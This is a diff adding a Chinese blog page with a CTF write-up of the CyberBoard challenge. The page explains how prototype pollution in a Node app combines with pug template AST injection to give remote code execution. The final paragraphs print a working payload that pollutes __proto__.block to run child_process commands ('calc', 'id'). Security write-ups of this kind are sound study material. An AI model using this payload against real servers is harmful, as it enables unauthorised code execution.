@@ -1,0 +1,115 @@
+<!DOCTYPE html><html lang="zn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="le0n"><meta name="renderer" content="webkit"><meta name="copyright" content="le0n"><meta name="keywords" content="Hexo"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>强网青少赛CyberBoard复现wp · le0n's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/owl.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">0wlle0n</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/0wlle0n" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">le0n's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">强网青少赛CyberBoard复现wp</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2024-11-28</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="发现有原型链污染"><a href="#发现有原型链污染" class="headerlink" title="发现有原型链污染"></a>发现有原型链污染</h1><img src="Pasted image 20241128120257.png">
+
+<h1 id="但是没有模板注入"><a href="#但是没有模板注入" class="headerlink" title="但是没有模板注入"></a>但是没有模板注入</h1><img src="Pasted image 20241128120437.png">
+
+<h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><p>会不会在其他地方有模板注入，再去看看其他地方，无果</p>
+<h1 id="一点思路"><a href="#一点思路" class="headerlink" title="一点思路"></a>一点思路</h1><p>我们的污染Message类的原型，改变它的属性不能造成rce，所以我们的思路变成继续向上污染，通过污染Object类的原型来改变其他类的属性，从而造成rce。</p>
+<h1 id="AST注入"><a href="#AST注入" class="headerlink" title="AST注入"></a>AST注入</h1><p>结合pug模板，通过改变它的AST语法树，我们能够影响模板解析的js代码，从而rce<br>可以看出这里的js字符串是直接当成命令执行的<br><img src="Pasted image 20241128164924.png"><br><img src="Pasted image 20241128165038.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`function template(locals) &#123;var pug_html = &quot;&quot;, pug_mixins = &#123;&#125;, pug_interp;var pug_debug_filename, pug_debug_line;try &#123;;\n var locals_for_with = (locals || &#123;&#125;);\n \n (function (messages, user) &#123;\n ;pug_debug_line = 1;pug_debug_filename = &quot;C:\\\\Users\\\\leon\\\\Desktop\\\\src\\\\views\\\\layout.pug&quot;;\npug_html = pug_html + &quot;\\u003C!DOCTYPE html\\u003E&quot;;\n;pug_debug_line = 2;pug_debug_filename = &quot;C:\\\\Users\\\\leon\\\\Desktop\\\\src\\\\views\\\\layout.pug&quot;;\npug_html = pug_html + &quot;\\u003Chtml lang=\\&quot;en\\&quot;\\u003E&quot;;\n;p…ug_html = pug_html + &quot;\\u003Cscript src=\\&quot;\\u002Fjs\\u002Fmain.js\\&quot;\\u003E\\u003C\\u002Fscript\\u003E\\u003C\\u002Fbody\\u003E\\u003C\\u002Fhtml\\u003E&quot;;\n &#125;.call(this, &quot;messages&quot; in locals_for_with ?\n locals_for_with.messages :\n typeof messages !== &#x27;undefined&#x27; ? messages : undefined, &quot;user&quot; in locals_for_with ?\n locals_for_with.user :\n typeof user !== &#x27;undefined&#x27; ? user : undefined));\n ;&#125; catch (err) &#123;pug.rethrow(err, pug_debug_filename, pug_debug_line);&#125;;return pug_html;&#125;`</span></span><br></pre></td></tr></table></figure>
+<p>怎么控制js呢？</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Code&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;While&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> (ast.<span class="property">block</span>) &#123; <span class="comment">// 注意这里</span></span><br><span class="line">            ast.<span class="property">block</span> = <span class="title function_">walkAST</span>(ast.<span class="property">block</span>, before, after, options);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
+<p>语法树中block会被递归解析<br><img src="Pasted image 20241128171817.png"><br>我们在pug_debug_line中插入要执行的代码，即让<br><code>Object.prototype.block = &#123;&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:`console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString())`&#125;;</code></p>
+<p><code>Object.prototype.block = &#123;&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:&quot;process.mainModule.require(&#39;child_process&#39;).exec(&#39;calc&#39;)&quot;&#125;;</code></p>
+<p>所以最终我们的payload是</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="string">&quot;1&quot;</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;block&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Text&quot;</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>拿到rce</p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://0wlle0n.github.io">le0n</a></p><p> <span>Link:  </span><a href="https://0wlle0n.github.io/2024/11/28/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9BCyberBoard%E5%A4%8D%E7%8E%B0wp/">https://0wlle0n.github.io/2024/11/28/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9BCyberBoard%E5%A4%8D%E7%8E%B0wp/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2024/11/19/vm1%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E8%AF%A6%E8%A7%A3/" title="vm1沙盒逃逸详解"><span>NextPost ></span><br><span class="nextTitle">vm1沙盒逃逸详解</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%9C%89%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.</span> <span class="toc-text">发现有原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E6%B2%A1%E6%9C%89%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">但是没有模板注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91"><span class="toc-number">3.</span> <span class="toc-text">踩坑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E7%82%B9%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">一点思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AST%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">AST注入</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
